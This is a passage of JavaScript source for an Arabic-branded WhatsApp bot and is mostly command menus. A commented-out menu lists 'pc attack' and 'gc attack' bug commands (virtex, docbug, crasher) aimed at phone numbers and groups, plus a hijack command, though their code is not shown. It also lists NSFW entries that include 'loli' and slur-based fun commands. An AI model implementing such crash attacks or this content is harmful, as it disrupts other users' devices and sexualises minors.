( .لفيديو )
♚ تحويل ملصق متحرك لفيديو 
 ꔹ━━━━━ꔹ
( .لصوتي )
♚ تحويل فيديو لصوتية 
 ꔹ━━━━━ꔹ
( .لمتحرك )
♚ تحويل ملصق لمتحرك
 ꔹ━━━━━ꔹ
 ( .اظبطها )
♚ لحذف خلفيه الصور
ꔹ━━━━━ꔹ
 ( .ايموجي )
♚ تحويل ايموجي لصوره
 ꔹ━━━━━ꔹ
 ( .تقصير )
♚ تقصير الروابط وجعلها قصيره
 ꔹ━━━━━ꔹ
( .اكتب )
♚ يكتب لك علي الملصق
𓍹——————————𓍻
𓆩اليك قائمة باوامر تغير الصوت𓆪
𓍹——————————𓍻
( .دبه )
♚ عمل دبه لصوت الاغنيه
ꔹ━━━━━ꔹ
( .ضوضاء )
♚ عمل ضوضاء لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .بطئ )
♚ عمل تبطئ لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .بطئ2 )
♚ عمل تبطئ لصوت الاغنيه
ꔹ━━━━━ꔹ
( .سريع )
♚ عمل تسريع لصوت الاغنيه
 ꔹ━━━━━ꔹ
( .طفل )
♚ عمل الاغنيه بصوت طفل
 ꔹ━━━━━ꔹ
( .عكس )
♚ عمل عكس لاغنيه 
ꔹ━━━━━ꔹ
( .روبوت )
♚ عمل الاغنيه بصوت روبوت
𓍹——————————𓍻
𓆩اليك قائمة باوامر التسليه𓆪
𓍹——————————𓍻
( .اكس )
♚ لعبه اكس او
 ꔹ━━━━━ꔹ
 ( .مغادره )
♚ مغادره الجيم في اكس او
 ꔹ━━━━━ꔹ
( .زواج )
♚ البوت يزوج اثنين عشوائي
 ꔹ━━━━━ꔹ
 ( .طلاق )
♚ البوت يطلق اثنين عشوائي
 ꔹ━━━━━ꔹ
 ( .زوجني )
♚ البوت يزوجك من شخص عشوائي
 ꔹ━━━━━ꔹ
 ( .طلقني )
♚ البوت يطلقك من شخص عشوائي
 ꔹ━━━━━ꔹ
( .رفيق )
♚ البوت يجيب لك رفيق عشوائي
 ꔹ━━━━━ꔹ
 ( .فراق )
♚ البوت يفارقك من رفيقك
 ꔹ━━━━━ꔹ
( .عكس )
♚ عكس كلمة او جملة 
ꔹ━━━━━ꔹ
( .اختفاء )
♚ اترك سبب ذاهبك
ꔹ━━━━━ꔹ
( .لولي )
♚ صوره عشوائيه لـ لولي
 ꔹ━━━━━ꔹ
( .نيكو )
♚ صوره عشوائيه لـ نيكو
 ꔹ━━━━━ꔹ
( .فيد )
♚ صوره عشوائيه لـ فيد
ꔹ━━━━━ꔹ
( .انمي )
♚ صوره عشوائيه لـ انمي
 ꔹ━━━━━ꔹ
( .قهوه )
♚ صوره عشوائيه لـ قهوه
 ꔹ━━━━━ꔹ
(. وايفي2 )
♚ صوره عشوائيه لـ وايفي2
ꔹ━━━━━ꔹ
( .نيكو2 )
♚ صوره عشوائيه لـ نيكو2
 ꔹ━━━━━ꔹ
 ( .نوم )
♚ صوره عشوائيه لـ نوم
 ꔹ━━━━━ꔹ
( .مانجا )
♚ صوره عشوائيه لـ مانجا`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break

case 'الاوامر': case 'اوامر': case 'menu': case 'alive': {
teks = `•╗ مرحبا ياعزيزي ⤌⤈       
𓆩 *${pushname}* 𓆪
•╣ انا بوت واتس اسمي
𓆩 *${global.botname}* 𓆪
•╣ اعمل في الخاص وجروبات
•╣ وظيفتي حماية جروبك
•╣ اكتب كلمه .الاوامر لمعرفه
•╣ اوامر البوت وطريقه الاستخدام
•╣ مميزات البوت كثيره جدا 
•╝ ويعمل بجودة فائقه وعاليه
𓍹————————————𓍻
𓆩قائمة اوامر سورس الجزار𓆪 
𓍹————————————𓍻
( .م1 ) ☞ اوامر الاعضاء
( .م2 ) ☞ اوامر المالك
( .م3 ) ☞  اوامر الجروبات
( .م4 ) ☞ اوامر البحث وتنزيل
( .م5 ) ☞ اوامر التحويل
( .م6 ) ☞ اوامر تغيير الصوت
( .م7 ) ☞ اوامر التسليه
( .م8 ) ☞ لعرض جميع الاومر
.المميزات ☞ لعرض مميزات البوت
.المطور ☞ لعرض مطور البوت
.السورس ☞ لعرض المبرمج`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
]
let buttonMessage = {
image: {url: `https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"ᴇʟɢᴀᴢᴀʀ ʙᴏт",
body: "سورس الجزار", 
thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break
            break
            case 'command': {
	const sections = [{
								"title": "Initial Features Of Bot 🦄",
								"rows": [
									{
										"title": "Other ☕",
										"description": "Displays The List Of Other Features",
										"rowId": `${prefix}othermenu`
									}
								]
							},
							{
								"title": "Bot Features ❤️",
								"rows": [
									{
										"title": "All Menu 🥀",
										"description": "Displays The List Of All The Features!",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "Owner Menu 💠",
										"description": "Displays The List Of Owner Features",
										"rowId": `${prefix}ownermenu`
										},
									{
										"title": "Group Menu ✨",
										"description": "Displays The List Of Main Features",
										"rowId": `${prefix}groupmenu`
										},
										{
										"title": "Maker Menu 🌈",
										"description": "Displays The List Of Logo Making Features",
										"rowId": `${prefix}makermenu`
									},
									{
										"title": "Sound Menu 🎵",
										"description": "Displays The List Of Sound Features",
										"rowId": `${prefix}soundmenu`
									},
									{
										"title": "Download Menu ↘️",
										"description": "Displays The List Of Download Features",
										"rowId": `${prefix}downloadmenu`
									},
									{
										"title": "Sticker Menu 🃏",
										"description": "Displays The List Of Sticker Features",
										"rowId": `${prefix}stickermenu`
									},
									{
										"title": "Search Menu 🔎",
										"description": "Displays The List Of Searching Features",
										"rowId": `${prefix}searchmenu`
									},
									{
										"title": "Random Image Menu 🌆",
										"description": "Displays The List Of Random Image Features",
										"rowId": `${prefix}randomimagemenu`
									},
									{
										"title": "Random Video Menu 🌆",
										"description": "Displays The List Of Random Video Features",
										"rowId": `${prefix}randomvideomenu`
									},
									{
										"title": "Image Effect Menu 🖼️",
										"description": "Displays The List Of Image Effect Features",
										"rowId": `${prefix}imageeffectmenu`
									},
										{
											"title": "Anime Menu 😘",
										"description": "Displays The List Of Random Anime Features",
										"rowId": `${prefix}animemenu`
										},
										{
											"title": "Emote Menu 😀",
										"description": "Displays The List Of Emote Features",
										"rowId": `${prefix}emotemenu`
										},
										{
										"title": "Anime Sticker Menu ☺️",
										"description": "Displays The List Of Anime Sticker Features",
										"rowId": `${prefix}animestickermenu`
									     },
									{
										"title": "Nsfw Menu 🤓",
										"description": "Displays The List Of Nsfe Features",
										"rowId": `${prefix}nsfwmenu`
									     },
										{
											"title": "Fun Menu 🕺",
										"description": "Displays The List Of Fun Features",
										"rowId": `${prefix}funmenu`
										},
										{
										"title": "Game Menu 🎮",
										"description": "Displays The List Of Game Features",
										"rowId": `${prefix}gamemenu`
									},
										{
											"title": "Convert Menu ⚒️",
										"description": "Displays The List Of Convert Features",
										"rowId": `${prefix}convertmenu`
										},
										{
											"title": "Database Menu ♻️",
										"description": "Displays The List Of Database Features",
										"rowId": `${prefix}databasemenu`
										},
										{
										"title": "Other Menu 🐸",
										"description": "Displays The List Miscellaneous Features",
										"rowId": `${prefix}othermenu`
									     },
										{
										"title": "War Menu☣️",
										"description": "Displays The List Of War Features",
										"rowId": `${prefix}warmenu`
									}
								]
							},
							{
								"title": "Chat With Fellow Users 🌝",
								"rows": [
									{
										"title": "Anonymous Chat Menu 🏻‍♂️",
										"description": "Displays The List Of Anonymous Chat Features",
										"rowId": `${prefix}anonymousmenu`
									}
								]
							},
							{
								"title": "Credit ©️",
								"rows": [
									{
										"title": "شكرا لك ❤️",
										"description": "Displays The List Of Credit Of The Bot !!",
										"rowId": `${prefix}tqtt`
									}
								]
							}
						]
const listMessage = {
  text: "الرجاء الاختيار من القائمه",
  footer: `${botname}\n📍يوتيوب: ${websitex}\n🍜انستا: ${botscript}`,
  title: `اهلا 👋 ${pushname}`,
  buttonText: "قائمه الاختيارات",
  sections
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, listMessage)
}
break
          /*  case 'allmenu': case 'كل القائمه' {
var unicorn = await getBuffer(picak+'All Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OWNER 	
╠ ${prefix}self
╠ ${prefix}public
╠ ${prefix}join [link]
╠ ${prefix}leavegc
╠ ${prefix}setbio
╠ ${prefix}bctext [text]
╠ ${prefix}bcimage [reply img/text]
╠ ${prefix}bcvideo [reply img/text]
╠ ${prefix}setbotpp [image]
╠ ${prefix}setthumb [reply img]
╠ ${prefix}setexif
╠ ${prefix}hijack
╠ ${prefix}creategroup [name]
╠ ${prefix}block [tag/number]
╠ ${prefix}unblock [tag/number]
╠═══════✪ GROUP 	        
╠${prefix}grouplink
╠${prefix}ephemeral [option]
╠${prefix}setgcpp [image]
╠${prefix}setname [text]
╠${prefix}setdesc [text]
╠${prefix}group 
╠${prefix}resetgrouplink
╠${prefix}editinfo [option]
╠${prefix}menfess [number]
╠${prefix}add [user]
╠${prefix}kick [reply/tag]
╠${prefix}hidetag [text]
╠${prefix}tagall [text]
╠${prefix}antilinkgc [on/off]
╠${prefix}antilinktg [on/off]
╠${prefix}antilinktt [on/off]
╠${prefix}antilinkytch [on/off]
╠${prefix}antilinkytvid [on/off]
╠${prefix}antilinkig [on/off]
╠${prefix}antilinkfb [on/off]
╠${prefix}antilinktwit [on/off]
╠${prefix}antilinkall [on/off]
╠${prefix}antivirus [on/off]
╠${prefix}antitoxic [on/off]
╠${prefix}antiwame [on/off]
╠${prefix}nsfw [on/off]
╠${prefix}promote [reply/tag]
╠${prefix}demote [reply/tag]
╠${prefix}react [reply emoji]
╠${prefix}vote
╠${prefix}devote
╠${prefix}upvote
╠${prefix}checkvote
╠${prefix}delvote
╠═══════✪ MAKER 
╠${prefix}candy
╠${prefix}blackpinkneon
╠${prefix}deepsea
╠${prefix}scifi
╠${prefix}fiction
╠${prefix}berry
╠${prefix}fruitjuice
╠${prefix}biscuit
╠${prefix}wood
╠${prefix}chocolate
╠${prefix}matrix
╠${prefix}blood
╠${prefix}halloween
╠${prefix}wicker
╠${prefix}darkgold
╠${prefix}firework
╠${prefix}skeleton
╠${prefix}sand
╠${prefix}glue
╠${prefix}leaves
╠${prefix}magma
╠${prefix}lava
╠${prefix}rockart
╠${prefix}bloodglas
╠${prefix}underwater
╠${prefix}textmaker
╠${prefix}honey
╠${prefix}ice
╠${prefix}watercolor
╠${prefix}multicolor
╠${prefix}snow
╠${prefix}harrypot
╠${prefix}harrypotter
╠${prefix}brokenglass
╠${prefix}waterpipe
╠${prefix}spooky
╠${prefix}circuit
╠${prefix}metallic
╠${prefix}demon
╠${prefix}sparklechristmas
╠${prefix}christmas
╠${prefix}3dchristmas
╠${prefix}3dbox
╠${prefix}waterdrop
╠${prefix}lion2
╠${prefix}papercut
╠${prefix}transformer
╠${prefix}neondevil
╠${prefix}3davengers
╠${prefix}3dstone
╠${prefix}3dstone2
╠${prefix}summertime
╠${prefix}thunder
╠${prefix}window
╠${prefix}graffiti
╠${prefix}graffitibike
╠${prefix}pornhub
╠${prefix}glitch
╠${prefix}blackpinkart
╠${prefix}glitch2
╠${prefix}glitch3
╠${prefix}3dspace
╠${prefix}lion
╠${prefix}3dneon
╠${prefix}greenneon
╠${prefix}bokeh
╠${prefix}holographic
╠${prefix}bear
╠${prefix}wolf
╠${prefix}joker
╠${prefix}dropwater
╠${prefix}dropwater2
╠${prefix}thewall
╠${prefix}neonlight
╠${prefix}natural
╠${prefix}carbon
╠${prefix}pencil
╠${prefix}blackpink2
╠${prefix}neon
╠${prefix}neonlight2
╠${prefix}toxic
╠${prefix}strawberry
╠${prefix}discovery
╠${prefix}1917
╠ ${prefix}sci_fi
╠ ${prefix}ancient
╠ ${prefix}fabric
╠ ${prefix}hoorror
╠ ${prefix}whitebear
╠ ${prefix}juice
╠ ${prefix}batman
╠ ${prefix}multicolor
╠ ${prefix}wonderful
╠ ${prefix}sketch
╠ ${prefix}marvel
╠ ${prefix}foggy
╠ ${prefix}writing
╠ ${prefix}halloweenfire
╠ ${prefix}halloween
╠ ${prefix}watercolor
╠ ${prefix}classic
╠═════✪ DOWNLOAD 	
╠${prefix}tiktok [url]
╠${prefix}tiktokaudio [url]
╠${prefix}instagram [url]
╠${prefix}spotify [url]
╠${prefix}mediafire [url]
╠${prefix}ytmp3 [url|quality]
╠${prefix}ytmp4 [url|quality]
╠${prefix}gitclone [repo link]
╠═══════✪ SEARCH 	
╠${prefix}play [query]
╠${prefix}song [query]
╠${prefix}yts [query]
╠${prefix}lyrics [query]
╠${prefix}gimage [query]
╠${prefix}google [query]
╠${prefix}anime [query]
╠${prefix}pinterest [query]
╠${prefix}image [query]
╠${prefix}wallpaper [query]
╠${prefix}searchno [number]
╠${prefix}horoscope [query]
╠${prefix}imdb [movie name]
╠${prefix}weather [loc name]
╠${prefix}genshin [char name]
╠${prefix}wikimedia [query]
╠${prefix}ytsearch [query]
╠${prefix}ringtone [query]
╠═══════✪ CONVERT 
╠ ${prefix}toimage [reply stick]
╠ ${prefix}sticker [reply img|gif]
╠ ${prefix}take [reply img|gif|stik]
╠ ${prefix}smeme [reply img]
╠ ${prefix}emoji [emoji]
╠ ${prefix}tovideo [reply img]
╠ ${prefix}togif [reply stick]
╠ ${prefix}tovn [reply aud]
╠ ${prefix}tomp3 [reply vn]
╠ ${prefix}toaudio [reply vid]
╠ ${prefix}ebinary [reply txt]
╠ ${prefix}dbinary [reply txt]
╠ ${prefix}tinyurl [link]
╠ ${prefix}styletext [text]
╠${prefix}volume [reply aud]
╠${prefix}bass [reply aud]
╠${prefix}blown [reply aud]
╠${prefix}deep [reply aud]
╠${prefix}earrape [reply aud]
╠${prefix}fast [reply aud]
╠${prefix}fat [reply aud]
╠${prefix}nightcore [reply aud]
╠${prefix}reverse [reply aud]
╠${prefix}robot [reply aud]
╠${prefix}slow [reply aud]
╠${prefix}smooth [reply aud]
╠${prefix}squirrel [reply aud]
╠═══════✪ IMG EFFECT 
╠${prefix}removebg [reply img]
╠═══════✪ RANDOM IMG 
╠${prefix}coffee
╠${prefix}woof
╠${prefix}meow
╠${prefix}lizard
╠${prefix}chinese
╠${prefix}japanese
╠${prefix}korean
╠${prefix}indo
╠${prefix}thai
╠${prefix}vietnamese
╠${prefix}malay
╠${prefix}hijab
╠${prefix}randomgirl
╠${prefix}randomboy
╠${prefix}aesthetic
╠${prefix}antiwork
╠${prefix}cosplay
╠${prefix}car
╠${prefix}bike
╠${prefix}doggo
╠${prefix}cat
╠${prefix}notnot
╠${prefix}kayes
╠${prefix}justina
╠${prefix}ryujin
╠${prefix}boneka
╠${prefix}rose
╠${prefix}kpop
╠${prefix}blackpink
╠${prefix}ulzzangboy
╠${prefix}ulzzanggirl
╠${prefix}pubg
╠${prefix}hacking
╠${prefix}profilepicture
╠${prefix}couplepicture
╠${prefix}wallphone
╠${prefix}wallml
╠═══════✪ RANDOM VIDEO
╠${prefix}tiktokgirl	
╠${prefix}tiktoknukhty
╠${prefix}tiktokpanrika
╠${prefix}tiktokkayes
╠${prefix}tiktoknotnot
╠${prefix}tiktokghea
╠${prefix}tiktoksantuy
╠${prefix}tiktokbocil
╠═══════✪ EMOTE 
╠${prefix}instagramemoji
╠${prefix}facebookemoji
╠${prefix}iphoneemoji
╠${prefix}samsungemoji
╠${prefix}joyemoji
╠${prefix}skypeemoji
╠${prefix}twitteremoji
╠${prefix}whatsappemoji
╠${prefix}microsoftemoji
╠${prefix}googleemoji
╠${prefix}pediaemoji
╠${prefix}microsoftemoji
╠═══════✪ ANIME 
╠${prefix}animeneko
╠${prefix}waifu
╠${prefix}animewaifu
╠${prefix}animeawoo
╠${prefix}shinobu
╠${prefix}foxgirl
╠${prefix}animemegumin
╠${prefix}loli-waifu
╠${prefix}8ball
╠${prefix}animenom
╠${prefix}goose
╠${prefix}avatar
╠${prefix}tickle
╠${prefix}gecg
╠${prefix}feed
╠${prefix}husbu
╠${prefix}neko2
╠${prefix}randomanime
╠${prefix}shota
╠${prefix}waifu2
╠${prefix}animeslap
╠${prefix}animepat
╠${prefix}animeneko
╠${prefix}animekiss
╠${prefix}animewlp
╠${prefix}animecuddle
╠${prefix}animecry
╠${prefix}animekill
╠${prefix}animelick
╠${prefix}animebite
╠${prefix}animeyeet
╠${prefix}animebully
╠${prefix}animebonk
╠${prefix}animewink
╠${prefix}animepoke
╠${prefix}animesmile
╠${prefix}animewave
╠${prefix}animeawoo
╠${prefix}animeblush
╠${prefix}animesmug
╠${prefix}animeglomp
╠${prefix}animehappy
╠${prefix}animedance
╠${prefix}animecringe
╠${prefix}animehighfive
╠${prefix}animehandhold
╠${prefix}animemegumin
╠${prefix}animesmug
╠${prefix}couplepp
╠${prefix}animewall [query]
╠${prefix}animewall2 [query]
╠══════✪ STICKER 
╠ ${prefix}patrick
╠ ${prefix}emoji
╠ ${prefix}emojimix
╠ ${prefix}doge
╠ ${prefix}lovesticker
╠ ${prefix}animestick
╠ ${prefix}spongebob
╠ ${prefix}gojosatoru
╠ ${prefix}nicholas
╠ ${prefix}cartoon
╠ ${prefix}stickman
╠════✪ ANIME STICKER 
╠${prefix}loli
╠${prefix}bully
╠${prefix}cuddle
╠${prefix}cry
╠${prefix}hug
╠${prefix}awoo
╠${prefix}kiss
╠${prefix}lick
╠${prefix}pat
╠${prefix}smug
╠${prefix}bonk
╠${prefix}yeet
╠${prefix}blush
╠${prefix}smile
╠${prefix}wave
╠${prefix}highfive
╠${prefix}handhold
╠${prefix}nom
╠${prefix}glomp
╠${prefix}bite
╠${prefix}slap
╠${prefix}kill
╠${prefix}happy
╠${prefix}wink
╠${prefix}poke
╠${prefix}dance
╠${prefix}cringe
╠${prefix}neko
╠${prefix}gura
╠═══════✪ NSFW 
╠${prefix}gifhentai
╠${prefix}gifblowjob
╠${prefix}hentaivideo
╠${prefix}hneko
╠${prefix}nwaifu
╠${prefix}animespank
╠${prefix}trap
╠${prefix}gasm
╠${prefix}ahegao
╠${prefix}ass
╠${prefix}bdsm
╠${prefix}blowjob
╠${prefix}cuckold
╠${prefix}cum
╠${prefix}milf
╠${prefix}eba
╠${prefix}ero
╠${prefix}femdom
╠${prefix}foot
╠${prefix}gangbang
╠${prefix}glasses
╠${prefix}hentai
╠${prefix}jahy
╠${prefix}manga
╠${prefix}masturbation
╠${prefix}neko-hentai
╠${prefix}neko-hentai2
╠${prefix}nsfwloli
╠${prefix}orgy
╠${prefix}panties
╠${prefix}pussy
╠${prefix}tentacles
╠${prefix}thights
╠${prefix}yuri
╠${prefix}zettai
╠═══════✪ FUN 
╠ ${prefix}say [text]
╠ ${prefix}define [text]
╠ ${prefix}how [text
╠ ${prefix}when [text]
╠ ${prefix}where [text]
╠ ${prefix}is [text]
╠ ${prefix}what [text]
╠ ${prefix}can [text]
╠ ${prefix}rate [text]
╠ ${prefix}coolcheck [tag]
╠ ${prefix}stupidcheck [tag]
╠ ${prefix}waifucheck [tag]
╠ ${prefix}evilcheck [tag]
╠ ${prefix}dogcheck [tag]
╠ ${prefix}hotcheck [tag]
╠ ${prefix}smartcheck [tag]
╠ ${prefix}uncleancheck [tag]
╠ ${prefix}greatcheck [tag]
╠ ${prefix}beautifulcheck [tag]
╠ ${prefix}awesomecheck [tag]
╠ ${prefix}prettycheck [tag]
╠ ${prefix}lesbiancheck [tag]
╠ ${prefix}gaycheck [tag]
╠ ${prefix}cutecheck [tag]
╠ ${prefix}uglycheck [tag]
╠ ${prefix}hornycheck [tag]
╠ ${prefix}charactercheck [tag]
╠ ${prefix}lovelycheck [tag]
╠ ${prefix}couple
╠ ${prefix}soulmate
╠ ${prefix}hot
╠ ${prefix}sexy
╠ ${prefix}kind
╠ ${prefix}idiot
╠ ${prefix}handsome
╠ ${prefix}beautiful
╠ ${prefix}cute
╠ ${prefix}pretty
╠ ${prefix}lesbian
╠ ${prefix}noob
╠ ${prefix}bastard
╠ ${prefix}foolish
╠ ${prefix}nerd
╠ ${prefix}asshole
╠ ${prefix}gay
╠ ${prefix}smart
╠ ${prefix}stubble
╠ ${prefix}dog
╠ ${prefix}horny
╠ ${prefix}cunt
╠ ${prefix}wibu
╠ ${prefix}noobra
╠ ${prefix}nibba
╠ ${prefix}nibbi
╠ ${prefix}comrade
╠ ${prefix}mumu
╠ ${prefix}rascal
╠ ${prefix}scumbag
╠ ${prefix}nuts
╠ ${prefix}fagot
╠ ${prefix}scoundrel
╠ ${prefix}ditch
╠ ${prefix}dope
╠ ${prefix}gucci
╠ ${prefix}lit
╠ ${prefix}dumbass
╠ ${prefix}crackhead
╠ ${prefix}mf
╠ ${prefix}motherfucker
╠ ${prefix}sucker
╠ ${prefix}fuckboy
╠ ${prefix}playboy
╠ ${prefix}fuckgirl
╠ ${prefix}playgirl
╠ ${prefix}quotes
╠══════✪ SOUND 
╠ ${prefix}sound1
╠ ${prefix}sound2
╠ ${prefix}sound3
╠ ${prefix}sound4
╠ ${prefix}sound5
╠ ${prefix}sound6
╠ ${prefix}sound7
╠ ${prefix}sound8
╠ ${prefix}sound9
╠ ${prefix}sound10
╠ ${prefix}sound11
╠ ${prefix}sound12
╠ ${prefix}sound13
╠ ${prefix}sound14
╠ ${prefix}sound15
╠ ${prefix}sound16
╠ ${prefix}sound17
╠ ${prefix}sound18
╠ ${prefix}sound19
╠ ${prefix}sound20
╠ ${prefix}sound21
╠ ${prefix}sound22
╠ ${prefix}sound23
╠ ${prefix}sound24
╠ ${prefix}sound25
╠ ${prefix}sound26
╠ ${prefix}sound27
╠ ${prefix}sound28
╠ ${prefix}sound29
╠ ${prefix}sound30
╠ ${prefix}sound31
╠ ${prefix}sound32
╠ ${prefix}sound33
╠ ${prefix}sound34
╠ ${prefix}sound35
╠ ${prefix}sound36
╠ ${prefix}sound37
╠ ${prefix}sound38
╠ ${prefix}sound39
╠ ${prefix}sound40
╠ ${prefix}sound41
╠ ${prefix}sound42
╠ ${prefix}sound43
╠ ${prefix}sound44
╠ ${prefix}sound45
╠ ${prefix}sound46
╠ ${prefix}sound47
╠ ${prefix}sound48
╠ ${prefix}sound49
╠ ${prefix}sound50
╠ ${prefix}sound51
╠ ${prefix}sound52
╠ ${prefix}sound53
╠ ${prefix}sound54
╠ ${prefix}sound55
╠ ${prefix}sound56
╠ ${prefix}sound57
╠ ${prefix}sound58
╠ ${prefix}sound59
╠ ${prefix}sound60
╠ ${prefix}sound61
╠ ${prefix}sound62
╠ ${prefix}sound63
╠ ${prefix}sound64
╠ ${prefix}sound65
╠ ${prefix}sound66
╠ ${prefix}sound67
╠ ${prefix}sound68
╠ ${prefix}sound69
╠ ${prefix}sound70
╠ ${prefix}sound71
╠ ${prefix}sound72
╠ ${prefix}sound73
╠ ${prefix}sound74
╠ ${prefix}sound75
╠ ${prefix}sound76
╠ ${prefix}sound77
╠ ${prefix}sound78
╠ ${prefix}sound79
╠ ${prefix}sound80
╠ ${prefix}sound81
╠ ${prefix}sound82
╠ ${prefix}sound83
╠ ${prefix}sound84
╠ ${prefix}sound85
╠ ${prefix}sound86
╠ ${prefix}sound87
╠ ${prefix}sound88
╠ ${prefix}sound89
╠ ${prefix}sound90
╠ ${prefix}sound91
╠ ${prefix}sound92
╠ ${prefix}sound93
╠ ${prefix}sound94
╠ ${prefix}sound95
╠ ${prefix}sound96
╠ ${prefix}sound97
╠ ${prefix}sound98
╠ ${prefix}sound99
╠ ${prefix}sound100
╠ ${prefix}sound101
╠ ${prefix}sound102
╠ ${prefix}sound103
╠ ${prefix}sound104
╠ ${prefix}sound105
╠ ${prefix}sound106
╠ ${prefix}sound107
╠ ${prefix}sound108
╠ ${prefix}sound109
╠ ${prefix}sound110
╠ ${prefix}sound111
╠ ${prefix}sound112
╠ ${prefix}sound113
╠ ${prefix}sound114
╠ ${prefix}sound115
╠ ${prefix}sound116
╠ ${prefix}sound117
╠ ${prefix}sound118
╠ ${prefix}sound119
╠ ${prefix}sound120
╠ ${prefix}sound121
╠ ${prefix}sound122
╠ ${prefix}sound123
╠ ${prefix}sound124
╠ ${prefix}sound125
╠ ${prefix}sound126
╠ ${prefix}sound127
╠ ${prefix}sound128
╠ ${prefix}sound129
╠ ${prefix}sound130
╠ ${prefix}sound131
╠ ${prefix}sound132
╠ ${prefix}sound133
╠ ${prefix}sound134
╠ ${prefix}sound135
╠ ${prefix}sound136
╠ ${prefix}sound137
╠ ${prefix}sound138
╠ ${prefix}sound139
╠ ${prefix}sound140
╠ ${prefix}sound141
╠ ${prefix}sound142
╠ ${prefix}sound143
╠ ${prefix}sound144
╠ ${prefix}sound145
╠ ${prefix}sound146
╠ ${prefix}sound147
╠ ${prefix}sound148
╠ ${prefix}sound149
╠ ${prefix}sound150
╠ ${prefix}sound151
╠ ${prefix}sound152
╠ ${prefix}sound153
╠ ${prefix}sound154
╠ ${prefix}sound155
╠ ${prefix}sound156
╠ ${prefix}sound157
╠ ${prefix}sound158
╠ ${prefix}sound159
╠ ${prefix}sound160
╠ ${prefix}sound161
╠══════✪ GAME 
╠ ${prefix}truth
╠ ${prefix}dare
╠ ${prefix}tictactoe
╠ ${prefix}delttt
╠ ${prefix}guess [option]
╠ ${prefix}math [mode]
╠ ${prefix}suitpvp [tag]
╠══✪ ANONYMOUS CHAT 
╠${prefix}anonymous
╠${prefix}start
╠${prefix}next
╠${prefix}leave
╠══════✪ DATABASE 
╠ ${prefix}setcmd
╠ ${prefix}listcmd
╠ ${prefix}delcmd
╠ ${prefix}lockcmd
╠ ${prefix}addmsg
╠ ${prefix}listmsg
╠ ${prefix}getmsg
╠ ${prefix}delmsg
╠══════✪ OTHER 
╠ ${prefix}afk
╠ ${prefix}id
╠ ${prefix}toqr [link]
╠ ${prefix}repeat
╠ ${prefix}readmore [text]
╠ ${prefix}toviewonce
╠ ${prefix}fliptext [text]]
╠ ${prefix}chatinfo
╠ ${prefix}alive
╠ ${prefix}script
╠ ${prefix}ping
╠ ${prefix}owner
╠ ${prefix}menu
╠ ${prefix}delete
╠ ${prefix}quoted
╠ ${prefix}listpc
╠ ${prefix}listgc
╠ ${prefix}donate
╠ ${prefix}request
╠ ${prefix}report [bug]
╠═══════✪「 BUG MENU 」	
╠════☾pc attack☽
╠${prefix}pcbut [number]
╠${prefix}pcvn [number]
╠${prefix}pcstick [number]
╠${prefix}pcfast [number]
╠${prefix}pcslow [number]
╠${prefix}pcbunny [number]
╠${prefix}xcrasher [amount]
╠${prefix}pccontact [amount]
╠${prefix}virtex5 [amount]
╠${prefix}flower [amount]
╠${prefix}pollbug [amount]
╠${prefix}catalogbug [amount]
╠${prefix}trollybug [amount]
╠${prefix}trollybug2 [amount]
╠════☾gc attack☽
╠${prefix}gcslow
╠${prefix}gcfast
╠${prefix}gcbunny
╠${prefix}tagallbug
╠════☾pc & gc attack☽
╠${prefix}vnbug [amount]
╠${prefix}docbug [amount]
╠${prefix}pcgcslow [number]
╠${prefix}pcgcfast [number]
╠${prefix}pcgcbunny [number]
╠${prefix}textshot
╠${prefix}docfuck [amount]
╠${prefix}docsoft [amount]
╠${prefix}docsoft2 [amount]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break*/
      case 'ownermenu':{
	   var unicorn = await getBuffer(picak+'Owner Menu')
const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner ??'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OWNER 	
╠ ${prefix}self
╠ ${prefix}public
╠ ${prefix}join [link]
╠ ${prefix}leavegc
╠ ${prefix}setbio
╠ ${prefix}hijack
╠ ${prefix}creategroup [name]
╠ ${prefix}block [user]
╠ ${prefix}unblock [user]
╠ ${prefix}broadcast [text]
╠ ${prefix}setppbot [image]
╠ ${prefix}setthumb [reply img]
╠ ${prefix}setexif
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await ElgazarBot.sendMessage(m.chat, buttonMessage)
}
break
            case 'groupmenu':{
var unicorn = await getBuffer(picak+'Group Menu')

const buttons = [
